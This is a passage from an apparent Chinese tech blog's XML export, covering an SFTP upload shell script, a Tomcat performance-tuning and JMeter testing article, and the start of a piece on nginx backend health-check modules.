<h3 id="使用shell上传"><a href="#使用shell上传" class="headerlink" title="使用shell上传"></a>使用shell上传</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">/bin/bash</span></span><br><span class="line">if [ -f ~/.bash_profile ];</span><br><span class="line">then</span><br><span class="line">  . ~/.bash_profile</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">FTP_ADDR=192.168.1.200</span><br><span class="line">FTP_USER=用户名</span><br><span class="line">FTP_PASS=密码</span><br><span class="line">FILE_ROOT_PATH=/usr/TicketEBPdata/</span><br><span class="line">FILE_PATH=/usr/TicketEBPdata/output/</span><br><span class="line">LOG_FILE=/usr/TicketEBPdata/output/lftp_output.txt</span><br><span class="line"></span><br><span class="line">ftpFunction() &#123;</span><br><span class="line">        lftp "sftp://$FTP_USER:$FTP_PASS@$FTP_ADDR" -e "PUT $FILE_PATH$1" &gt;$LOG_FILE 2&gt;&amp;1 &lt;&lt;- EOF</span><br><span class="line">bye</span><br><span class="line">EOF</span><br><span class="line">&#125;</span><br><span class="line">filelist=`ls $FILE_PATH`</span><br><span class="line">for file in $filelist</span><br><span class="line">do</span><br><span class="line">  if [ -f "$FILE_PATH""$file" ];then</span><br><span class="line">echo $file;   </span><br><span class="line">        ftpFunction $file</span><br><span class="line"></span><br><span class="line">	if [ -s "$LOG_FILE" ]; then</span><br><span class="line">           mv $LOG_FILE $FILE_ROOT_PATH</span><br><span class="line">           break</span><br><span class="line">        else</span><br><span class="line">        rm -rf $LOG_FILE</span><br><span class="line">        mv output/* history -f </span><br><span class="line">        fi</span><br><span class="line">  fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>运维技术</category>
        <category>服务部署</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomcat性能优化和测试</title>
    <url>/articles/6f151fe3.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>Tomcat是我们经常使用的 servlet容器之一，甚至很多线上产品都使用 Tomcat充当服务器。而且优化后的Tomcat性能提升显著，本文从以下几方面进行分析优化。</p>
<a id="more"></a>



<h2 id="JVM内存优化"><a href="#JVM内存优化" class="headerlink" title="JVM内存优化"></a>JVM内存优化</h2><p>默认情况下Tomcat的相关内存配置较低，这对于一些大型项目显然是不够用的，这些项目运行就已经耗费了大部分内存空间，何况大规模访问的情况。即使是本文中的这个只有一个页面的超小项目，在并发达到一定程度后也会抛出OOM（OutOfMemoryError）的异常报错。</p>
<p>OOM报错：说明Tomcat已经无力支持访问处理，内部GC也已经“无能无力”。所以一般情况下我们需要重新配置Tomcat的相关内存大小。</p>
<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a><strong>配置</strong></h3><p>Linux下修改TOMCAT_HOME/bin/catalina.sh，在其中加入，可以放在CLASSPATH=下面：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">JAVA_OPTS="-server -Xms2048m -Xmx2048m -XX:PermSize=512M -XX:MaxPermSize=1024m"</span><br></pre></td></tr></table></figure>

<p>windows下修改TOMCAT_HOME/bin/catalina.bat，在其中加入，可以放在set CLASSPATH=下面：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set JAVA_OPTS=-server -Xms2048m -Xmx2048m  -XX:PermSize=512M -XX:MaxPermSize=1024m</span><br></pre></td></tr></table></figure>

<p> 这些参数在我们学习JVM部分文章时已经都认识过了，不过这里还是简单介绍下:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-server：启用 JDK的 server 版本；</span><br><span class="line">-Xms：Java虚拟机初始化时堆的最小内存,一般与Xmx配置为相同值,好处是GC不必再为扩展内存空间而消耗性能；</span><br><span class="line">-Xmx：Java虚拟机可使用堆的最大内存；</span><br><span class="line">-XX:PermSize：Java虚拟机永久代大小；</span><br><span class="line">-XX:MaxPermSize：Java虚拟机永久代大小最大值；</span><br></pre></td></tr></table></figure>

<p>除了这些参数外您还可以根据具体需要配置其他参数，可以参考JVM参数的配置<a href="https://docs.oracle.com/javase/7/docs/technotes/tools/solaris/java.html" target="_blank" rel="noopener">JDK7</a>和<a href="https://docs.oracle.com/javase/8/docs/technotes/tools/unix/java.html" target="_blank" rel="noopener">JDK8</a>。</p>
<h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a><strong>验证</strong></h3><p>设置成功后我们可以利用JDK自带的工具进行验证，这些工具都在JAVA_HOME/bin目录下：</p>
<p> 1）jps：用来显示本地的java进程，以及进程号，进程启动的路径等。</p>
<p> 2）jmap：观察运行中的JVM 物理内存的占用情况，包括Heap size,Perm size等。</p>
<h2 id="高并发优化"><a href="#高并发优化" class="headerlink" title="高并发优化"></a><strong>高并发优化</strong></h2><p>我们知道TOMCAT_HOME/conf/server.xml可以配置端口，虚拟路径等等 Tomcat相关主要配置。</p>
<h3 id="连接器优化"><a href="#连接器优化" class="headerlink" title="连接器优化"></a><strong>连接器优化</strong></h3><p>Connector是连接器，负责接收客户的请求，以及向客户端回送响应的消息。所以 Connector的优化是重要部分。默认情况下 Tomcat只支持200线程访问，超过这个数量的连接将被等待甚至超时放弃，所以我们需要提高这方面的处理能力。</p>
<p>修改这部分配置需要修改TOMCAT_HOME/conf/server.xml，打开server.xml找到Connector 标签项，默认配置如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;Connector port="8080" protocol="HTTP/1.1"  </span><br><span class="line">           connectionTimeout="20000"  </span><br><span class="line">           redirectPort="8443" /&gt;</span><br></pre></td></tr></table></figure>

<p>其中port代表服务接口；protocol代表协议类型；connectionTimeout代表连接超时时间，单位为毫秒；redirectPort代表安全通信（https）转发端口，一般配置成443。</p>
<p>可以看到除了这几个基本配置外并无特殊功能，所以我们需要对 Connector 进行扩展。</p>
<p>其中Connector 支持参数属性可以参考<a href="https://tomcat.apache.org/tomcat-8.0-doc/config/http.html" target="_blank" rel="noopener">Tomcat官方网站</a>非常多，所以本文就只介绍些常用的。</p>
<p>我们将 Connector 配置修改为如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;Connector port="8080"   </span><br><span class="line">          protocol="HTTP/1.1"   </span><br><span class="line">          maxThreads="1000"   </span><br><span class="line">          minSpareThreads="100"   </span><br><span class="line">          acceptCount="1000"  </span><br><span class="line">          maxConnections="1000"  </span><br><span class="line">          connectionTimeout="20000"   </span><br><span class="line">          maxHttpHeaderSize="8192"  </span><br><span class="line">          tcpNoDelay="true"  </span><br><span class="line">          compression="on"  </span><br><span class="line">          compressionMinSize="2048"  </span><br><span class="line">          disableUploadTimeout="true"  </span><br><span class="line">          redirectPort="8443"  </span><br><span class="line">      	  enableLookups="false"  </span><br><span class="line">          URIEncoding="UTF-8" /&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参数解释：</span><br><span class="line"></span><br><span class="line">port：代表Tomcat监听端口，也就是网站的访问端口，默认为8080，可以根据需要改成其他。</span><br><span class="line">protocol：协议类型，可选类型有四种，分别为BIO（阻塞型IO），NIO，NIO2和APR。</span><br><span class="line"> 1）BIO：BIO(Blocking I/O)，顾名思义，即阻塞式I/O操作，表示Tomcat使用的是传统的Java I/O操作(即java.io包及其子包)。Tomcat在默认情况下，是以bio模式运行的。遗憾的是，就一般而言，bio模式是三种运行模式中性能最低的一种。BIO配置采用默认即可。</span><br><span class="line"> 2）NIO：NIO(New I/O)，是Java SE 1.4及后续版本提供的一种新的I/O操作方式(即java.nio包及其子包)。Java nio是一个基于缓冲区、并能提供非阻塞I/O操作的Java API，因此nio也被看成是non-blocking I/O的缩写。它拥有比传统I/O操作(bio)更好的并发运行性能。要让Tomcat以nio模式来运行也比较简单，我们只需要protocol类型修改如下即可：    </span><br><span class="line">//NIO  </span><br><span class="line">protocol=&quot;org.apache.coyote.http11.Http11NioProtocol&quot;  </span><br><span class="line">//NIO2  </span><br><span class="line">protocol=&quot;org.apache.coyote.http11.Http11Nio2Protocol&quot;  </span><br><span class="line"> 3）APR：APR(Apache Portable Runtime/Apache可移植运行时)，是Apache HTTP服务器的支持库。你可以简单地理解为:Tomcat将以JNI的形式调用 Apache HTTP服务器的核心动态链接库来处理文件读取或网络传输操作，从而大大地提高 Tomcat对静态文件的处理性能。</span><br><span class="line">与配置NIO运行模式一样，也需要将对应的 Connector节点的 protocol属性值改为：</span><br><span class="line">protocol=&quot;org.apache.coyote.http11.Http11AprProtocol&quot;  </span><br><span class="line"></span><br><span class="line">maxThreads：由该连接器创建的处理请求线程的最大数目，也就是可以处理的同时请求的最大数目。如果未配置默认值为200。如果一个执行器与此连接器关联，则忽略此属性，因为该属性将被忽略，所以该连接器将使用执行器而不是一个内部线程池来执行任务。</span><br><span class="line">maxThreads是一个重要的配置属性，maxThreads配置的合理直接影响了Tomcat的相关性能，所以这里我们重点讨论下。</span><br><span class="line">maxThreads并不是配置的越大越好，事实上你即使配置成999999也是没有用的，因为这个最大值是受操作系统及相关硬件所制约的，并且最大值并不一定是最优值，所以我们追寻的应该是最优值而不是最大值。</span><br><span class="line"></span><br><span class="line">QPS（Query Per Second）：每秒查询率QPS是对一个特定的查询服务器在规定时间内所处理流量多少的衡量标准。我们常常使用 QPS值来衡量一个服务器的性能。</span><br><span class="line">QPS = 并发数 / 平均响应时间 或者 并发数 = QPS * 平均响应时间</span><br><span class="line">一个系统吞吐量通常由QPS、并发数两个因素决定，每套系统的这两个值都有一个相对极限值，在应用场景访问压力下，只要某一项达到系统最高值，系统的吞吐量就上不去了，如果压力继续增大，系统的吞吐量反而会下降，原因是系统超负荷工作，上下文切换、内存等等其它消耗导致系统性能下降。所谓吞吐量这里可以理解为每秒能处理请求的次数。</span><br><span class="line"></span><br><span class="line">所以选择一个合理的maxThreads值，其实并不是那么容易的事。因为过多的线程只会造成更多的内存开销，更多的CPU开销，但是对提升QPS确毫无帮助；找到最佳线程数后通过简单的设置，可以让web系统更加稳定，得到最高，最稳定的QPS输出。</span><br><span class="line"></span><br><span class="line">我们可以通过以下几种方式来获取 maxThreads的最佳值：</span><br><span class="line">1. 通过线上系统不断使用和用户的不断增长来进行性能测试，观察QPS，响应时间，这种方式会在爆发式增长时系统崩溃，如双12等。</span><br><span class="line">2. 根据公式计算，服务器端最佳线程数量=((线程等待时间+线程cpu时间)/线程cpu时间) * cpu数量，这种方式有时会被误导，因为某些系统处理环节可能会耗时比较长，从而影响公式的结果。</span><br><span class="line">3. 单、多用户压力测试，查看CPU的消耗，然后直接乘以百分比，再进行压测，一般这个值的附近应该就是最佳线程数量，这种方式理想场景比较适用，实际情况会比这个复杂的多。</span><br><span class="line">4. 根据系统的自身情况调整，如硬件限制，系统限制，程序处理能力限制等。</span><br><span class="line">5. 定期修改为不同的 maxThreads值，看服务器响应结果及用户反应。</span><br><span class="line"></span><br><span class="line">QPS和线程数的关系</span><br><span class="line">1）在最佳线程数量之前，QPS和线程是互相递增的关系，线程数量到了最佳线程之后，QPS持平，不在上升，甚至略有下降，同时相应时间持续上升。</span><br><span class="line">2）同一个系统而言，支持的线程数越多（最佳线程数越多而不是配置的线程数越多），QPS越高</span><br><span class="line"></span><br><span class="line">QPS和响应时间的关系</span><br><span class="line">1）对于一般的web系统，响应时间一般有CPU执行时间+IO等待时间组成。</span><br><span class="line">2）CPU的执行时间减少，对QPS有实质的提升，IO时间的减少，对QPS提升不明显。如果要想明显提升QPS，优化系统的时候要着重优化CPU消耗大户。</span><br><span class="line"></span><br><span class="line">所以想要找出maxThreads的最优值可并不容易，没有最好只有更好，更好的值只能通过时间来显现，如果你不想考虑那么多，一般情况下设置成1000即可。</span><br><span class="line"></span><br><span class="line">minSpareThreads：线程的最小运行数目，这些始终保持运行。如果未指定，默认值为10。</span><br><span class="line">acceptCount：当所有可能的请求处理线程都在使用时传入连接请求的最大队列长度。如果未指定，默认值为100。一般是设置的跟 maxThreads一样或一半，此值设置的过大会导致排队的请求超时而未被处理。所以这个值应该是主要根据应用的访问峰值与平均值来权衡配置。</span><br><span class="line">maxConnections：在任何给定的时间内，服务器将接受和处理的最大连接数。当这个数字已经达到时，服务器将接受但不处理，等待进一步连接。NIO与NIO2的默认值为10000，APR默认值为8192。</span><br><span class="line">connectionTimeout：当请求已经被接受，但未被处理，也就是等待中的超时时间。单位为毫秒，默认值为60000。通常情况下设置为30000。</span><br><span class="line">maxHttpHeaderSize：请求和响应的HTTP头的最大大小，以字节为单位指定。如果没有指定，这个属性被设置为8192（8 KB）。</span><br><span class="line">tcpNoDelay：如果为true，服务器socket会设置TCP_NO_DELAY选项，在大多数情况下可以提高性能。缺省情况下设为true。</span><br><span class="line">compression：是否启用gzip压缩，默认为关闭状态。这个参数的可接受值为“off”（不使用压缩），“on”（压缩文本数据），“force”（在所有的情况下强制压缩）。</span><br><span class="line">compressionMinSize：如果compression=&quot;on&quot;，则启用此项。被压缩前数据的最小值，也就是超过这个值后才被压缩。如果没有指定，这个属性默认为“2048”（2K），单位为byte。</span><br><span class="line">disableUploadTimeout：这个标志允许servlet [Container](http://lib.csdn.net/base/4)在一个servlet执行的时候，使用一个不同的，更长的连接超时。最终的结果是给servlet更长的时间以便完成其执行，或者在数据上载的时候更长的超时时间。如果没有指定，设为false。</span><br><span class="line">enableLookups：关闭DNS反向查询。</span><br><span class="line">URIEncoding：URL编码字符集。</span><br></pre></td></tr></table></figure>

<p>连接器还有很多其他参数，可以参考Tomcat官网，这里只介绍与性能相关的部分。</p>
<h3 id="协议"><a href="#协议" class="headerlink" title="协议"></a><strong>协议</strong></h3><p>通过配置 protocol的类型可以使用不同的 Connector处理请求。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">//BIO  </span><br><span class="line">protocol="HTTP/1.1"  </span><br><span class="line">//NIO  </span><br><span class="line">protocol="org.apache.coyote.http11.Http11NioProtocol"  </span><br><span class="line">//NIO2  </span><br><span class="line">protocol="org.apache.coyote.http11.Http11Nio2Protocol"  </span><br><span class="line">//APR  </span><br><span class="line">protocol="org.apache.coyote.http11.Http11AprProtocol"</span><br></pre></td></tr></table></figure>

<p> 以下是几种类型 Connector的参数对比：</p>
<p><img src="/articles/6f151fe3/1.png" alt></p>
<p>并不是说 BIO的性能就一定不如 NIO，这几种类型 Connector之间并没有明显的性能区别，它们之间实现流程和原理不同，所以它们的选择是需要根据应用的类型来决定的。</p>
<p>BIO更适合处理简单流程，如程序处理较快可以立即返回结果。简单项目及应用可以采用BIO。</p>
<p>NIO更适合后台需要耗时完成请求的操作，如程序接到了请求后需要比较耗时的处理这已请求，所以无法立即返回结果，这样如果采用BIO就会占用一个连接，而使用NIO后就可以将此连接转让给其他请求，直至程序处理完成返回为止。</p>
<p>APR可以大大提升Tomcat对静态文件的处理性能，同时如果你使用了HTTPS方式传输的话，也可以提升SSL的处理性能。详见<a href="https://wandouduoduo.github.io/articles/98d7cf0b.html" target="_blank" rel="noopener">Tomcat优化之APR模式</a></p>
<h3 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a><strong>线程池</strong></h3><p>Executor代表了一个线程池，可以在Tomcat组件之间共享。使用线程池的好处在于减少了创建销毁线程的相关消耗，而且可以提高线程的使用效率。</p>
<p>要想使用线程池，首先需要在 Service标签中配置 Executor，如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;Service name="Catalina"&gt;  </span><br><span class="line">  </span><br><span class="line">  &lt;Executor name="tomcatThreadPool"   </span><br><span class="line">         namePrefix="catalina-exec-"   </span><br><span class="line">         maxThreads="1000"   </span><br><span class="line">         minSpareThreads="100"  </span><br><span class="line">         maxIdleTime="60000"  </span><br><span class="line">         maxQueueSize="Integer.MAX_VALUE"  </span><br><span class="line">         prestartminSpareThreads="false"  </span><br><span class="line">         threadPriority="5"  </span><br><span class="line">         className="org.apache.catalina.core.StandardThreadExecutor"/&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参数解释：</span><br><span class="line">name：线程池名称，用于 Connector中指定。</span><br><span class="line">namePrefix：所创建的每个线程的名称前缀，一个单独的线程名称为 namePrefix+threadNumber。</span><br><span class="line">maxThreads：池中最大线程数。</span><br><span class="line">minSpareThreads：活跃线程数，也就是核心池线程数，这些线程不会被销毁，会一直存在。</span><br><span class="line">maxIdleTime：线程空闲时间，超过该时间后，空闲线程会被销毁，默认值为6000（1分钟），单位毫秒。</span><br><span class="line">maxQueueSize：在被执行前最大线程排队数目，默认为Int的最大值，也就是广义的无限。除非特殊情况，这个值不需要更改，否则会有请求不会被处理的情况发生。</span><br><span class="line">prestartminSpareThreads：启动线程池时是否启动 minSpareThreads部分线程。默认值为false，即不启动。</span><br><span class="line">threadPriority：线程池中线程优先级，默认值为5，值从1到10。</span><br><span class="line">className：线程池实现类，未指定情况下，默认实现类为org.apache.catalina.core.StandardThreadExecutor。如果想使用自定义线程池首先需要实现 org.apache.catalina.Executor接口。</span><br></pre></td></tr></table></figure>

<p>线程池配置完成后需要在 Connector中指定：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;Connector executor="tomcatThreadPool"  </span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h3 id="监听器"><a href="#监听器" class="headerlink" title="监听器"></a><strong>监听器</strong></h3><p>另一个影响Tomcat 性能的因素是内存泄露。Server标签中可以配置多个Listener，其中 JreMemoryLeakPreventionListener是用来预防JRE内存泄漏。此Listener只需在Server标签中配置即可，默认情况下无需配置，已经添加在 Server中。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;Listener className="org.apache.catalina.core.JreMemoryLeakPreventionListener" /&gt;</span><br></pre></td></tr></table></figure>



<h2 id="性能测试"><a href="#性能测试" class="headerlink" title="性能测试"></a>性能测试</h2><p> Tomcat优化部分我们已经完成，接下来就需要比较一下优化前与优化后的性能对比。</p>
<h3 id="Jmeter介绍"><a href="#Jmeter介绍" class="headerlink" title="Jmeter介绍"></a><strong>Jmeter介绍</strong></h3><p>Apache JMeter是Apache组织开发的基于Java的压力测试工具。用于对软件做压力测试，它最初被设计用于Web应用测试，但后来扩展到其他测试领域。 它可以用于测试静态和动态资源，例如静态文件、Java小服务程序、CGI 脚本、Java 对象、数据库、FTP 服务器， 等等。JMeter 可以用于对服务器、网络或对象模拟巨大的负载，来自不同压力类别下测试它们的强度和分析整体性能。另外，JMeter能够对应用程序做功能/回归测试，通过创建带有断言的脚本来验证你的程序返回了你期望的结果。为了最大限度的灵活性，JMeter允许使用正则表达式创建断言。</p>
<p>Apache jmeter 可以用于对静态的和动态的资源（文件，Servlet，Perl脚本，java 对象，数据库和查询，FTP服务器等等）的性能进行测试。它可以用于对服务器、网络或对象模拟繁重的负载来测试它们的强度或分析不同压力类型下的整体性能。你可以使用它做性能的图形分析或在大并发负载测试你的服务器/脚本/对象。</p>
<p>Jmeter官网：<a href="http://jmeter.apache.org/" target="_blank" rel="noopener">http://jmeter.apache.org/</a></p>
<h3 id="Jmeter作用"><a href="#Jmeter作用" class="headerlink" title="Jmeter作用"></a>Jmeter作用</h3><p>（1）能够对HTTP和FTP服务器进行压力和性能测试， 也可以对任何数据库进行同样的测试（通过JDBC），Jmeter支持以下服务器协议类型测试：</p>
<p>​    • Web - HTTP, HTTPS    • SOAP / REST   • FTP   • Database via JDBC  • LDAP</p>
<p>​    • Message-oriented middleware (MOM) via JMS    • Mail - SMTP(S), POP3(S) and IMAP(S)</p>
<p>​    • MongoDB (NoSQL)   • Native commands or shell scripts   • TCP</p>
<p> （2）完全的可移植性和100% 纯java。</p>
<p> （3）完全 Swing 和轻量组件支持（预编译的JAR使用 javax.swing.*)包。</p>
<p> （4）完全多线程 框架允许通过多个线程并发取样和 通过单独的线程组对不同的功能同时取样。</p>
<p> （5）精心的GUI设计允许快速操作和更精确的计时。</p>
<p> （6）缓存和离线分析/回放测试结果。</p>
<h3 id="Jmeter特性"><a href="#Jmeter特性" class="headerlink" title="Jmeter特性"></a>Jmeter特性</h3><p>（1）可链接的取样器允许无限制的测试能力。</p>
<p>（2）各种负载统计表和可链接的计时器可供选择。</p>
<p>（3）数据分析和可视化插件提供了很好的可扩展性以及个性化。</p>
<p>（4）具有提供动态输入到测试的功能（包括JavaScript）。</p>
<p>（5）支持脚本编程的取样器（在1.9.2及以上版本支持BeanShell）。</p>
<p>在设计阶段，JMeter能够充当HTTP PROXY（代理）来记录IE/NETSCAPE的HTTP请求，也可以记录apache等WebServer的log文件来重现HTTP流量。当这些HTTP客户端请求被记录以后，测试运行时可以方便的设置重复次数和并发度（线程数）来产生巨大的流量。JMeter还提供可视化组件以及报表工具把量服务器在不同压力下的性能展现出来。</p>
<p>相比其他HTTP测试工具,JMeter最主要的特点在于扩展性强。JMeter能够自动扫描其lib/ext子目录下.jar文件中的插件，并且将其装载到内存，让用户通过不同的菜单调用。</p>
<h3 id="Jmeter使用"><a href="#Jmeter使用" class="headerlink" title="Jmeter使用"></a>Jmeter使用</h3><p>使用Jmeter非常简单，windows下进入bin目录直接双击jmeter.bat文件即可，Linux下类似，需要运行jmeter.sh文件，Jmeter运行后显示以下界面：</p>
<p><img src="/articles/6f151fe3/5.png" alt></p>
<p>Jmeter使用起来比较简单，附件是一个简单的配置，直接导入即可使用。</p>
<h3 id="测试条件"><a href="#测试条件" class="headerlink" title="测试条件"></a>测试条件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Tomcat版本：8.0.33</span><br><span class="line">测试项目：新创建一个web项目也不用实现任何代码，只需要部署即可以使用，只有一个index.jsp文件。</span><br><span class="line">JDK版本：jdk1.7.0.67</span><br><span class="line">请求方式：POST</span><br><span class="line">循环次数：100，1000</span><br><span class="line">线程数：10,100,1000</span><br><span class="line">总次数：总次数 = 线程数 * 循环次数</span><br><span class="line">CPU：英特尔 第二代酷睿 i5-2450M（双核）</span><br><span class="line">内存：8GB</span><br></pre></td></tr></table></figure>

<h3 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h3><p>从部分结果来看优化过的Tomcat会比默认性能及并发处理能力上有提高，但至于参数的配置需要结合硬件及操作系统来不断调整，所以并不会有一个万能的参数来使用，需要各位不断的测试不断更改。</p>
<p>以下是一个简单的测试结果，循环100次，线程数分别为10,100,1000：</p>
<p><img src="/articles/6f151fe3/6.png" alt></p>
<p>各位估计已经发现了相同的应用下并不一定某种protocol就一定性能出色，因为Tomcat中的这个测试项目只有一个index.jsp页面，在较少线程数访问情况下BIO反应最快，而当线程数达到1000时NIO2性能最出色，而APR中规中矩，虽然这种测试的局限性很大，但也可以反映出：想要找出适合的配置及最佳性能需要结合实际，不断的测试与改进，最终才能达到一个相对稳定的性能，虽然此时的性能未必是最佳的，但却是能应对绝大多数情况的。</p>
<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>Tomcat相关优化也只是一个入门介绍，每一种技术之中还是有很多很深奥的知识要去学习，只有不断的去学习才能不断的提高。</p>
]]></content>
      <categories>
        <category>容器化</category>
        <category>Tomcat</category>
      </categories>
      <tags>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title>nginx之后端节点健康检查</title>
    <url>/articles/d05be736.html</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>公司前一段对业务线上的nginx做了整理，重点就是对nginx上负载均衡器的后端节点做健康检查。目前，nginx对后端节点健康检查的方式主要有3种，这里列出：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1、ngx_http_proxy_module 模块和ngx_http_upstream_module模块（自带）</span><br><span class="line">    官网地址：http://nginx.org/cn/docs/http/ngx_http_proxy_module.html#proxy_next_upstream</span><br><span class="line"></span><br><span class="line">2、nginx_upstream_check_module模块</span><br><span class="line">    官网网址：https://github.com/yaoweibin/nginx_upstream_check_module</span><br><span class="line"></span><br><span class="line">3、ngx_http_healthcheck_module模块</span><br><span class="line">    官网网址：http://wiki.nginx.org/NginxHttpHealthcheckModule</span><br></pre></td></tr></table></figure>

<p>公司业务线上对后端节点的健康检查是通过nginx_upstream_check_module模块做的，这里我将分别介绍这三种实现方式以及之间的差异性。  </p>
<a id="more"></a>

<h2 id="模块详解"><a href="#模块详解" class="headerlink" title="模块详解"></a>模块详解</h2><h3 id="ngx-http-proxy-module-模块-和ngx-http-upstream-module模块-（自带）"><a href="#ngx-http-proxy-module-模块-和ngx-http-upstream-module模块-（自带）" class="headerlink" title="ngx_http_proxy_module 模块 和ngx_http_upstream_module模块 （自带）"></a>ngx_http_proxy_module 模块 和ngx_http_upstream_module模块 （自带）</h3><p>严格来说，nginx自带是没有针对负载均衡后端节点的健康检查的，但是可以通过默认自带的 ngx_http_proxy_module 模块 和ngx_http_upstream_module模块中的相关指令来完成当后端节点出现故障时，自动切换到健康节点来提供访问。</p>
<p>这里列出这两个模块中相关的指令：</p>
<p><strong>ngx_http_proxy_module 模块中的</strong> <strong>proxy_connect_timeout 指令、 proxy_read_timeout指令和proxy_next_upstream指令</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">语法:	proxy_connect_timeout time;</span><br><span class="line">默认值:	proxy_connect_timeout 60s;</span><br><span class="line">上下文:	http, server, location</span><br></pre></td></tr></table></figure>

<p>设置与后端服务器建立连接的超时时间。应该注意这个超时一般不可能大于75秒。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">语法:	proxy_read_timeout time;</span><br><span class="line">默认值:	proxy_read_timeout 60s;</span><br><span class="line">上下文:	http, server, location</span><br></pre></td></tr></table></figure>

<p>定义从后端服务器读取响应的超时。此超时是指相邻两次读操作之间的最长时间间隔，而不是整个响应传输完成的最长时间。如果后端服务器在超时时间段内没有传输任何数据，连接将被关闭。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">语法:	proxy_next_upstream error | timeout | invalid_header | http_500 | http_502 | http_503 | http_504 |http_404 | off ...;</span><br><span class="line">默认值:	proxy_next_upstream error timeout;</span><br><span class="line">上下文:	http, server, location</span><br></pre></td></tr></table></figure>

<p>指定在何种情况下一个失败的请求应该被发送到下一台后端服务器：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">error      # 和后端服务器建立连接时，或者向后端服务器发送请求时，或者从后端服务器接收响应头时，出现错误</span><br><span class="line">timeout    # 和后端服务器建立连接时，或者向后端服务器发送请求时，或者从后端服务器接收响应头时，出现超时</span><br><span class="line">invalid_header  # 后端服务器返回空响应或者非法响应头</span><br><span class="line">http_500   # 后端服务器返回的响应状态码为500</span><br><span class="line">http_502   # 后端服务器返回的响应状态码为502</span><br><span class="line">http_503   # 后端服务器返回的响应状态码为503</span><br><span class="line">http_504   # 后端服务器返回的响应状态码为504</span><br><span class="line">http_404   # 后端服务器返回的响应状态码为404</span><br><span class="line">off        # 停止将请求发送给下一台后端服务器</span><br></pre></td></tr></table></figure>

<p>需要理解一点的是，只有在没有向客户端发送任何数据以前，将请求转给下一台后端服务器才是可行的。也就是说，如果在传输响应到客户端时出现错误或者超时，这类错误是不可能恢复的。</p>
<p><strong>范例如下</strong>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">proxy_next_upstream http_502 http_504 http_404 error timeout invalid_header;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>ngx_http_upstream_module模块中的server指令</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">语法:	server address [parameters];</span><br><span class="line"></span><br><span class="line">默认值:	―</span><br><span class="line"></span><br><span class="line">上下文:	upstream</span><br></pre></td></tr></table></figure>

<p>范例如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">upstream name &#123;</span><br><span class="line">    server 10.1.1.110:8080 max_fails=1 fail_timeout=10s;</span><br><span class="line">    server 10.1.1.122:8080 max_fails=1 fail_timeout=10s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面是每个指令的介绍：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">max_fails=number      # 设定Nginx与服务器通信的尝试失败的次数。在fail_timeout参数定义的时间段内，如果失败的次数达到此值，Nginx就认为服务器不可用。在下一个fail_timeout时间段，服务器不会再被尝试。 失败的尝试次数默认是1。设为0就会停止统计尝试次数，认为服务器是一直可用的。 你可以通过指令proxy_next_upstream、fastcgi_next_upstream和 memcached_next_upstream来配置什么是失败的尝试。 默认配置时，http_404状态不被认为是失败的尝试。</span><br><span class="line">fail_timeout=time       # 设定服务器被认为不可用的时间段以及统计失败尝试次数的时间段。在这段时间中，服务器失败次数达到指定的尝试次数，服务器就被认为不可用。默认情况下，该超时时间是10秒。</span><br><span class="line">       在实际应用当中，如果你后端应用是能够快速重启的应用，比如nginx的话，自带的模块是可以满足需求的。但是需要注意。如果后端有不健康节点，负载均衡器依然会先把该请求转发给该不健康节点，然后再转发给别的节点，这样就会浪费一次转发。</span><br><span class="line">       可是，如果当后端应用重启时，重启操作需要很久才能完成的时候就会有可能拖死整个负载均衡器。此时，由于无法准确判断节点健康状态，导致请求handle住，出现假死状态，最终整个负载均衡器上的所有节点都无法正常响应请求。由于公司的业务程序都是java开发的，因此后端主要是nginx集群和tomcat集群。由于tomcat重启应部署上面的业务不同，有些业务启动初始化时间过长，就会导致上述现象的发生，因此不是很建议使用该模式。</span><br><span class="line">       并且ngx_http_upstream_module模块中的server指令中的max_fails参数设置值，也会和ngx_http_proxy_module 模块中的的proxy_next_upstream指令设置起冲突。比如如果将max_fails设置为0，则代表不对后端服务器进行健康检查，这样还会使fail_timeout参数失效（即不起作用）。此时，其实我们可以通过调节ngx_http_proxy_module 模块中的 proxy_connect_timeout 